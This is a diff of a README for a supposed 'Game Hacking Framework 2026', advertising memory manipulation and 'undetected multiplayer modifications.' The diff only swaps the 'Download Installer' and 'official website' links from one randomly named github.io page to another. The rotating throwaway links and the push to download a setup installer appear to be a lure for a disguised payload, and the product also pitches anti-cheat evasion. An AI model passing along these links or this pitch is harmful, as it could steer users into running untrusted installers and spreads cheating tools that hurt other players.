@@ -2,7 +2,7 @@
 
 Welcome to the Game Hacking Framework 2026, the ultimate suite for advanced game exploitation and reverse engineering. This framework provides all-in-one tools for memory manipulation, real-time game analysis, and undetected multiplayer modifications, designed for both internal and external game hacking needs in 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup--Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup--Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -42,6 +42,6 @@ A: Updates are announced on the official website. Download the new "Setup-latest
 
 ## Download
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For additional resources, troubleshooting guides, and community support, visit our GitHub repository or join the Discord server linked on the download page. Stay updated with the latest features and enhancements for all-in-one game hacking needs.
